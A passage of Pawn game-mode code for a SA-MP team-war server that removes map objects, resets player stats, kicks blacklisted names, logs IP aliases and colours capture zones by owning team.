RemoveBuildingForPlayer(playerid, 7670, 1028.1563, 2240.7656, 13.3984, 0.25);
RemoveBuildingForPlayer(playerid, 7671, 1066.4141, 2110.7578, 14.4141, 0.25);
RemoveBuildingForPlayer(playerid, 7674, 1029.3594, 2082.8516, 13.9219, 0.25);
RemoveBuildingForPlayer(playerid, 7675, 1031.6172, 2173.8203, 15.9219, 0.25);
RemoveBuildingForPlayer(playerid, 7684, 1144.2578, 2075.4922, 10.8438, 0.25);
RemoveBuildingForPlayer(playerid, 3539, 1030.7891, 2318.2266, 12.3438, 0.25);
RemoveBuildingForPlayer(playerid, 1268, 1108.3672, 2073.5938, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1268, 1003.4844, 2178.4922, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 7943, 1174.8438, 2083.3359, 13.6250, 0.25);
RemoveBuildingForPlayer(playerid, 7492, 1028.1563, 2240.7656, 13.3984, 0.25);
RemoveBuildingForPlayer(playerid, 1350, 1013.2734, 2282.7578, 9.8125, 0.25);
RemoveBuildingForPlayer(playerid, 1350, 1017.6094, 2298.5938, 9.8125, 0.25);
RemoveBuildingForPlayer(playerid, 7494, 1044.5234, 2347.9297, 13.3984, 0.25);
RemoveBuildingForPlayer(playerid, 3466, 1030.7891, 2318.2266, 12.3438, 0.25);
RemoveBuildingForPlayer(playerid, 3474, 1080.5234, 2069.8125, 16.7422, 0.25);
RemoveBuildingForPlayer(playerid, 1421, 1065.2813, 2078.8047, 10.5859, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1092.5000, 2079.9297, 16.7734, 0.25);
RemoveBuildingForPlayer(playerid, 1421, 1071.7578, 2079.2266, 10.5859, 0.25);
RemoveBuildingForPlayer(playerid, 1438, 1073.8984, 2078.3438, 9.8203, 0.25);
RemoveBuildingForPlayer(playerid, 1438, 1069.0313, 2079.1406, 9.8203, 0.25);
RemoveBuildingForPlayer(playerid, 1421, 1057.4141, 2080.1016, 10.5859, 0.25);
RemoveBuildingForPlayer(playerid, 1438, 1059.5625, 2079.2109, 9.8203, 0.25);
RemoveBuildingForPlayer(playerid, 7620, 1029.3594, 2082.8516, 13.9219, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1092.5703, 2084.4844, 16.7734, 0.25);
RemoveBuildingForPlayer(playerid, 925, 1082.4922, 2089.3203, 10.8984, 0.25);
RemoveBuildingForPlayer(playerid, 925, 1094.2422, 2090.8281, 15.4063, 0.25);
RemoveBuildingForPlayer(playerid, 1259, 1108.3672, 2073.5938, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1522, 1157.4844, 2073.0000, 10.0469, 0.25);
RemoveBuildingForPlayer(playerid, 7540, 1147.2969, 2075.9531, 9.9375, 0.25);
RemoveBuildingForPlayer(playerid, 7973, 1144.2578, 2075.4922, 10.8438, 0.25);
RemoveBuildingForPlayer(playerid, 7914, 1108.4531, 2075.2656, 31.1563, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1071.8906, 2094.5781, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 939, 1062.4219, 2093.1563, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1066.3984, 2094.5781, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 931, 1082.4922, 2092.1172, 10.8984, 0.25);
RemoveBuildingForPlayer(playerid, 1414, 1065.4453, 2093.3359, 10.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1414, 1072.5703, 2093.3359, 10.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1414, 1061.1406, 2091.9219, 10.9063, 0.25);
RemoveBuildingForPlayer(playerid, 939, 1064.2188, 2099.2813, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1072.2734, 2099.2813, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 1438, 1081.3438, 2096.6953, 9.8203, 0.25);
RemoveBuildingForPlayer(playerid, 1414, 1064.1172, 2100.4688, 10.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1414, 1071.2422, 2100.4688, 10.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1421, 1082.5000, 2104.2734, 10.5859, 0.25);
RemoveBuildingForPlayer(playerid, 1438, 1081.0938, 2102.0234, 9.8203, 0.25);
RemoveBuildingForPlayer(playerid, 7647, 1005.2891, 2105.4531, 21.1016, 0.25);
RemoveBuildingForPlayer(playerid, 1440, 1080.7188, 2105.8359, 10.3438, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1066.3984, 2108.1719, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1071.8906, 2108.1719, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1061.0703, 2108.4922, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 1414, 1061.1406, 2107.3516, 10.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1440, 1081.5313, 2108.3047, 10.3438, 0.25);
RemoveBuildingForPlayer(playerid, 7497, 1066.4141, 2110.7578, 14.4141, 0.25);
RemoveBuildingForPlayer(playerid, 7619, 1066.4141, 2110.7578, 14.4141, 0.25);
RemoveBuildingForPlayer(playerid, 7832, 1066.4141, 2110.7578, 14.4141, 0.25);
RemoveBuildingForPlayer(playerid, 3474, 1024.2578, 2110.6953, 16.7422, 0.25);
RemoveBuildingForPlayer(playerid, 1414, 1072.7422, 2109.4922, 10.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1441, 1084.2578, 2110.3828, 10.4766, 0.25);
RemoveBuildingForPlayer(playerid, 1414, 1065.6172, 2109.4922, 10.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1448, 1063.1094, 2110.9063, 9.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1421, 1061.1719, 2111.5547, 10.5781, 0.25);
RemoveBuildingForPlayer(playerid, 1421, 1082.5000, 2113.0234, 10.5859, 0.25);
RemoveBuildingForPlayer(playerid, 1421, 1062.3594, 2115.2891, 10.5781, 0.25);
RemoveBuildingForPlayer(playerid, 1438, 1072.8672, 2116.3516, 9.8203, 0.25);
RemoveBuildingForPlayer(playerid, 1448, 1066.5313, 2111.9531, 9.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1448, 1068.2734, 2111.9609, 9.9063, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1056.7188, 2119.7031, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1056.7188, 2124.8906, 12.2656, 0.25);
RemoveBuildingForPlayer(playerid, 1448, 1069.3125, 2121.2422, 9.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1431, 1061.6328, 2118.4531, 10.3672, 0.25);
RemoveBuildingForPlayer(playerid, 1438, 1071.4297, 2116.9688, 9.8203, 0.25);
RemoveBuildingForPlayer(playerid, 1438, 1070.2266, 2118.7891, 9.8203, 0.25);
RemoveBuildingForPlayer(playerid, 1431, 1060.5781, 2120.3438, 10.3672, 0.25);
RemoveBuildingForPlayer(playerid, 1431, 1062.4453, 2121.3750, 10.3672, 0.25);
RemoveBuildingForPlayer(playerid, 1431, 1061.2578, 2124.0625, 10.3672, 0.25);
RemoveBuildingForPlayer(playerid, 1431, 1061.2109, 2127.3828, 10.3672, 0.25);
RemoveBuildingForPlayer(playerid, 1431, 1059.9219, 2125.1172, 10.3672, 0.25);
RemoveBuildingForPlayer(playerid, 1431, 1061.1172, 2130.0391, 10.3672, 0.25);
RemoveBuildingForPlayer(playerid, 1448, 1067.8438, 2120.5547, 9.9063, 0.25);
RemoveBuildingForPlayer(playerid, 3459, 1016.6953, 2144.4609, 17.3203, 0.25);
RemoveBuildingForPlayer(playerid, 7622, 1031.6172, 2173.8203, 15.9219, 0.25);
RemoveBuildingForPlayer(playerid, 7915, 1005.1641, 2178.3984, 31.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1259, 1003.4844, 2178.4922, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 3474, 1052.8359, 2191.4844, 16.7422, 0.25);
RemoveBuildingForPlayer(playerid, 931, 1094.2422, 2094.8828, 15.4063, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1092.5703, 2101.0703, 16.7734, 0.25);
RemoveBuildingForPlayer(playerid, 942, 1092.5000, 2105.5078, 16.7734, 0.25);
RemoveBuildingForPlayer(playerid, 7621, 1139.7578, 2132.6406, 15.9219, 0.25);
//Malaysia Base
RemoveBuildingForPlayer(playerid, 8229, 1142.0313, 1362.5000, 12.4844, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 1031.9219, 1323.3359, 23.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1341, 1030.5938, 1362.5938, 10.8125, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 1038.5391, 1361.2266, 23.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 1117.2813, 1204.7109, 23.9375, 0.25);
RemoveBuildingForPlayer(playerid, 8326, 1172.2031, 1433.2813, 8.4453, 0.25);
	//----
	PlayerInfo[playerid][dRank] = 0;
    PlayerInfo[playerid][Deaths] = 0;
	PlayerInfo[playerid][Kills] = 0;
	PlayerInfo[playerid][Jailed] = 0;
	PlayerInfo[playerid][Frozen] = 0;
	PlayerInfo[playerid][Level] = 0;
	PlayerInfo[playerid][Helper] = 0;
	PlayerInfo[playerid][OnDuty] = 0;
	PlayerInfo[playerid][LoggedIn] = 0;
	PlayerInfo[playerid][Registered] = 0;
	PlayerInfo[playerid][God] = 0;
	PlayerInfo[playerid][GodCar] = 0;
	PlayerInfo[playerid][TimesSpawned] = 0;
	PlayerInfo[playerid][Muted] = 0;
	PlayerInfo[playerid][MuteWarnings] = 0;
	PlayerInfo[playerid][Warnings] = 0;
	PlayerInfo[playerid][Caps] = 0;
	PlayerInfo[playerid][DoorsLocked] = 0;
	PlayerInfo[playerid][pCar] = -1;
	PlayerInfo[playerid][SpamCount] = 0;
	PlayerInfo[playerid][SpamTime] = 0;
	PlayerInfo[playerid][PingCount] = 0;
	PlayerInfo[playerid][PingTime] = 0;
	PlayerInfo[playerid][FailLogin] = 0;
	PlayerInfo[playerid][blip] = 0;
	PlayerInfo[playerid][ConnectTime] = gettime();
	AntiSK[playerid] = 0;
	//------------------------------------------------------
	Attach3DTextLabelToPlayer(RankLabel[playerid], playerid, 0.0, 0.0, 0.5);
	//------------------------------------------------------
	new PlayerName[MAX_PLAYER_NAME], string[128]; //file[256];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	new tmp3[50]; GetPlayerIp(playerid,tmp3,50);
	//-----------------------------------------------------
	//-----------------------------------------------------
	//-----------------------------------------------------
	if(ServerInfo[NameKick] == 1) {
		for(new s = 0; s < BadNameCount; s++) {
  			if(!strcmp(BadNames[s],PlayerName,true)) {
				SendClientMessage(playerid,red, "Your name is on our black list, you have been kicked.");
				format(string,sizeof(string),"%s ID:%d was auto kicked. (Reason: Forbidden name)",PlayerName,playerid);
				SendClientMessageToAll(grey, string);  print(string);
				SaveToFile("KickLog",string);  Kick(playerid);
				return 1;
			}
		}
	}
	//-----------------------------------------------------
	if(ServerInfo[PartNameKick] == 1) {
		for(new s = 0; s < BadPartNameCount; s++) {
			new pos;
			while((pos = strfind(PlayerName,BadPartNames[s],true)) != -1) for(new i = pos, j = pos + strlen(BadPartNames[s]); i < j; i++)
			{
				SendClientMessage(playerid,red, "Your name is not allowed on this server, you have been kicked.");
				format(string,sizeof(string),"%s ID:%d was auto kicked. (Reason: Forbidden name)",PlayerName,playerid);
				SendClientMessageToAll(grey, string);  print(string);
				SaveToFile("KickLog",string);  Kick(playerid);
				return 1;
			}
		}
	}
	//-----------------------------------------------------
	if(ServerInfo[Locked] == 1) {
		PlayerInfo[playerid][AllowedIn] = false;
		SendClientMessage(playerid,red,"Server is Locked!  You have 20 seconds to enter the server password before you are kicked!");
		SendClientMessage(playerid,red," Type /password [password]");
		LockKickTimer[playerid] = SetTimerEx("AutoKick", 20000, 0, "i", playerid);
	}
	//-----------------------------------------------------
	if(strlen(dini_Get("ladmin/config/aka.txt", tmp3)) == 0) dini_Set("ladmin/config/aka.txt", tmp3, PlayerName);
 	else
	{
	    if( strfind( dini_Get("ladmin/config/aka.txt", tmp3), PlayerName, true) == -1 )
		{
		    format(string,sizeof(string),"%s,%s", dini_Get("ladmin/config/aka.txt",tmp3), PlayerName);
		    dini_Set("ladmin/config/aka.txt", tmp3, string);
		}
	}
	//-----------------------------------------------------
	/*TextDrawShowForPlayer(playerid, tBox);
	for(new line; line<15; line++)
	{
	  TextDrawShowForPlayer(playerid, Message[line]);
	}
	*/
	Streak[playerid] = 0;
	//------
	if(tCP[SNAKE] == TEAM_NONE) GangZoneShowForAll(Zone[SNAKE], -66);
	else if(tCP[SNAKE] == TEAM_ML) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_ML_COLOR);
	else if(tCP[SNAKE] == TEAM_DUBAI) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[SNAKE] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[SNAKE] == TEAM_INDIA) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[SNAKE] == TEAM_USA) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_USA_COLOR);
	else if(tCP[SNAKE] == TEAM_NEPAL) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[SNAKE] == TEAM_CHINA) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_CHINA_COLOR);
	//------
	if(tCP[BAY] == TEAM_NONE) GangZoneShowForAll(Zone[BAY], -66);
	else if(tCP[BAY] == TEAM_ML) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_ML_COLOR);
	else if(tCP[BAY] == TEAM_DUBAI) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[BAY] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[BAY] == TEAM_INDIA) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[BAY] == TEAM_USA) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_USA_COLOR);
	else if(tCP[BAY] == TEAM_NEPAL) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[BAY] == TEAM_CHINA) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_CHINA_COLOR);
	//------
	if(tCP[BIG] == TEAM_NONE) GangZoneShowForAll(Zone[BIG], -66);
	else if(tCP[BIG] == TEAM_ML) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_ML_COLOR);
    else if(tCP[BIG] == TEAM_DUBAI) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[BIG] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[BIG] == TEAM_INDIA) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[BIG] == TEAM_USA) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_USA_COLOR);
	else if(tCP[BIG] == TEAM_NEPAL) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[BIG] == TEAM_CHINA) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_CHINA_COLOR);
	//------
	if(tCP[ARMY] == TEAM_NONE) GangZoneShowForAll(Zone[ARMY], -66);
	else if(tCP[ARMY] == TEAM_ML) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_ML_COLOR);
	else if(tCP[ARMY] == TEAM_DUBAI) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[ARMY] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[ARMY] == TEAM_INDIA) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[ARMY] == TEAM_USA) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_USA_COLOR);
	else if(tCP[ARMY] == TEAM_NEPAL) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[ARMY] == TEAM_CHINA) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_CHINA_COLOR);
	//------
	if(tCP[PETROL] == TEAM_NONE) GangZoneShowForAll(Zone[PETROL], -66);
	else if(tCP[PETROL] == TEAM_ML) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_ML_COLOR);
	else if(tCP[PETROL] == TEAM_DUBAI) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[PETROL] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[PETROL] == TEAM_INDIA) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[PETROL] == TEAM_USA) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_USA_COLOR);
	else if(tCP[PETROL] == TEAM_NEPAL) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[PETROL] == TEAM_CHINA) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_CHINA_COLOR);
	//------
	if(tCP[OIL] == TEAM_NONE) GangZoneShowForAll(Zone[OIL], -66);
	else if(tCP[OIL] == TEAM_ML) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_ML_COLOR);
	else if(tCP[OIL] == TEAM_DUBAI) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[OIL] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[OIL] == TEAM_INDIA) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[OIL] == TEAM_USA) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_USA_COLOR);
	else if(tCP[OIL] == TEAM_NEPAL) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[OIL] == TEAM_CHINA) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_CHINA_COLOR);
	//------
	if(tCP[DESERT] == TEAM_NONE) GangZoneShowForAll(Zone[DESERT], -66);
	else if(tCP[DESERT] == TEAM_ML) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_ML_COLOR);
	else if(tCP[DESERT] == TEAM_DUBAI) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[DESERT] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[DESERT] == TEAM_INDIA) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[DESERT] == TEAM_USA) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_USA_COLOR);
	else if(tCP[DESERT] == TEAM_NEPAL) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[DESERT] == TEAM_CHINA) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_CHINA_COLOR);
	//------
	if(tCP[QUARRY] == TEAM_NONE) GangZoneShowForAll(Zone[QUARRY], -66);
	else if(tCP[QUARRY] == TEAM_ML) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_ML_COLOR);
	else if(tCP[QUARRY] == TEAM_DUBAI) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[QUARRY] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[QUARRY] == TEAM_INDIA) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[QUARRY] == TEAM_USA) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_USA_COLOR);
	else if(tCP[QUARRY] == TEAM_NEPAL) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[QUARRY] == TEAM_CHINA) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_CHINA_COLOR);
	//------
	if(tCP[GUEST] == TEAM_NONE) GangZoneShowForAll(Zone[GUEST], -66);
	else if(tCP[GUEST] == TEAM_ML) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_ML_COLOR);
	else if(tCP[GUEST] == TEAM_DUBAI) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[GUEST] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[GUEST] == TEAM_INDIA) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[GUEST] == TEAM_USA) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_USA_COLOR);
	else if(tCP[GUEST] == TEAM_NEPAL) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[GUEST] == TEAM_CHINA) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_CHINA_COLOR);
	//------
	if(tCP[EAR] == TEAM_NONE) GangZoneShowForAll(Zone[EAR], -66);
	else if(tCP[EAR] == TEAM_ML) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_ML_COLOR);
	else if(tCP[EAR] == TEAM_DUBAI) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[EAR] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[EAR] == TEAM_INDIA) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[EAR] == TEAM_USA) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_USA_COLOR);
	else if(tCP[EAR] == TEAM_NEPAL) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[EAR] == TEAM_CHINA) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_CHINA_COLOR);
	//-----
	if(tCP[AIRPORT] == TEAM_NONE) GangZoneShowForAll(Zone[AIRPORT], -66);
	else if(tCP[AIRPORT] == TEAM_ML) GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_ML_COLOR);
	else if(tCP[AIRPORT] == TEAM_DUBAI) GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[AIRPORT] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[AIRPORT] == TEAM_INDIA) GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[AIRPORT] == TEAM_USA) GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_USA_COLOR);
	else if(tCP[AIRPORT] == TEAM_NEPAL) GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[AIRPORT] == TEAM_CHINA) GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_CHINA_COLOR);
	//-----
	if(tCP[SHIP] == TEAM_NONE) GangZoneShowForAll(Zone[SHIP], -66);
	else if(tCP[SHIP] == TEAM_ML) GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_ML_COLOR);
	else if(tCP[SHIP] == TEAM_DUBAI) GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[SHIP] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[SHIP] == TEAM_INDIA) GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[SHIP] == TEAM_USA) GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_USA_COLOR);
	else if(tCP[SHIP] == TEAM_NEPAL) GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[SHIP] == TEAM_CHINA) GangZoneShowForAll(Zone[SHIP], TEAM_ZONE_CHINA_COLOR);
	//-----
	if(tCP[GAS] == TEAM_NONE) GangZoneShowForAll(Zone[GAS], -66);
	else if(tCP[GAS] == TEAM_ML) GangZoneShowForAll(Zone[GAS], TEAM_ZONE_ML_COLOR);
	else if(tCP[GAS] == TEAM_DUBAI) GangZoneShowForAll(Zone[GAS], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[GAS] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[GAS], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[GAS] == TEAM_INDIA) GangZoneShowForAll(Zone[GAS], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[GAS] == TEAM_USA) GangZoneShowForAll(Zone[GAS], TEAM_ZONE_USA_COLOR);
	else if(tCP[GAS] == TEAM_NEPAL) GangZoneShowForAll(Zone[GAS], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[GAS] == TEAM_CHINA) GangZoneShowForAll(Zone[GAS], TEAM_ZONE_CHINA_COLOR);
	//-----
	if(tCP[RES] == TEAM_NONE) GangZoneShowForAll(Zone[RES], -66);
	else if(tCP[RES] == TEAM_ML) GangZoneShowForAll(Zone[RES], TEAM_ZONE_ML_COLOR);
	else if(tCP[RES] == TEAM_DUBAI) GangZoneShowForAll(Zone[RES], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[RES] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[RES], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[RES] == TEAM_INDIA) GangZoneShowForAll(Zone[RES], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[RES] == TEAM_USA) GangZoneShowForAll(Zone[RES], TEAM_ZONE_USA_COLOR);
	else if(tCP[RES] == TEAM_NEPAL) GangZoneShowForAll(Zone[RES], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[RES] == TEAM_CHINA) GangZoneShowForAll(Zone[RES], TEAM_ZONE_CHINA_COLOR);
	//-----
	/*if(tCP[NPP] == TEAM_NONE) GangZoneShowForAll(Zone[NPP], -66);
	else if(tCP[NPP] == TEAM_ML) GangZoneShowForAll(Zone[NPP], TEAM_ZONE_ML_COLOR);
	else if(tCP[NPP] == TEAM_DUBAI) GangZoneShowForAll(Zone[NPP], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[NPP] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[NPP], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[NPP] == TEAM_INDIA) GangZoneShowForAll(Zone[NPP], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[NPP] == TEAM_USA) GangZoneShowForAll(Zone[NPP], TEAM_ZONE_USA_COLOR);
	else if(tCP[NPP] == TEAM_NEPAL) GangZoneShowForAll(Zone[NPP], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[NPP] == TEAM_CHINA) GangZoneShowForAll(Zone[NPP], TEAM_ZONE_CHINA_COLOR);*/
	//-----
	if(tCP[MOTEL] == TEAM_NONE) GangZoneShowForAll(Zone[MOTEL], -66);
	else if(tCP[MOTEL] == TEAM_ML) GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_ML_COLOR);
	else if(tCP[MOTEL] == TEAM_DUBAI) GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_DUBAI_COLOR);
	else if(tCP[MOTEL] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[MOTEL] == TEAM_INDIA) GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[MOTEL] == TEAM_USA) GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_USA_COLOR);
	else if(tCP[MOTEL] == TEAM_NEPAL) GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[MOTEL] == TEAM_CHINA) GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_CHINA_COLOR);
	//-----
	if(tCP[HOSPITAL] == TEAM_NONE) GangZoneShowForAll(Zone[HOSPITAL], -66);
	else if(tCP[HOSPITAL] == TEAM_ML) GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_ML_COLOR);
	else if(tCP[HOSPITAL] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[HOSPITAL] == TEAM_INDIA) GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[HOSPITAL] == TEAM_USA) GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_USA_COLOR);
	else if(tCP[HOSPITAL] == TEAM_NEPAL) GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[HOSPITAL] == TEAM_CHINA) GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_CHINA_COLOR);
	//-----
	if(tCP[BATTLESHIP] == TEAM_NONE) GangZoneShowForAll(Zone[BATTLESHIP], -66);
